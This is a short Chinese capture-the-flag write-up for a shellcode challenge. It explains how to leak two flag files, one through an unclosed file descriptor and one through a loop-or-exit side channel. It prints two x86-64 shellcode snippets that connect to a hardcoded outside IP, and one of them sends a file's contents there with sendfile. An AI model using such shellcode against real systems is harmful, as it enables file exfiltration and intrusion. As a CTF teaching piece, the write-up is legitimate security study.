# ezshellcode

很简单的一个题目，基本上是以下几个点：

1. 手动混淆（bushi，区别出变量`1`和`l`，就可以看到两个flag文件，一个open之后没有close，一个是读到内存中没有memset
2. 没有close的用sendfile，然后看代码或者调试可以指导没有close的文件的fd是4
3. 没有memset的flag，直接恢复栈帧，然后调一个偏移（use after return？），然后侧信道
4. 侧信道判断远程是loop还是exit，可以建立一个连接到本地，然后本地用subprocess起一个`nc -lp portNum`，如果远程exit，本地的nc也会挂，如果loop就不挂，然后用poll方法检查nc是否挂了。

exp我没写完整的，但是大致就是这两段shellcode：

```python
shellcode1 = '''
    mov rsp, fs:[0x300]
    push SYS_socket /* 0x29 */
    pop rax
    push AF_INET /* 2 */
    pop rdi
    push SOCK_STREAM /* 1 */
    pop rsi
    syscall

    xchg rdi, rax;
    mov rax, 0xd28b7501b2250002
    push rax

    push SYS_connect /* 0x2a */
    pop rax
    
    mov dl, 0x10;
    push rsp;pop rsi;
    syscall

    push 0x20;pop r10;
    push 0;mov rdx,rsp
    push 4
    pop rsi
    /* call sendfile() */
    push SYS_sendfile /* 0x28 */
    pop rax
    syscall
    '''
shellcode2 = f'''
                mov rsp, fs:[0x300]
                
                mov al, 0x29
                mov dil, 2
                mov sil, 1
                syscall

                xchg edi, eax;
                mov rbx, 0xd28b7501b2250002
                push rbx
                
                mov al, 0x2a
                mov dl, 0x10;
                push rsp;pop rsi;
                syscall
                
                sub sp, 2144
                mov dl,byte ptr [rsp+{i}]
                mov cl,{ord(mid)}
                cmp dl,cl
                jz loop
                mov al,0x3c
                syscall
                loop:
                jmp loop
                '''
```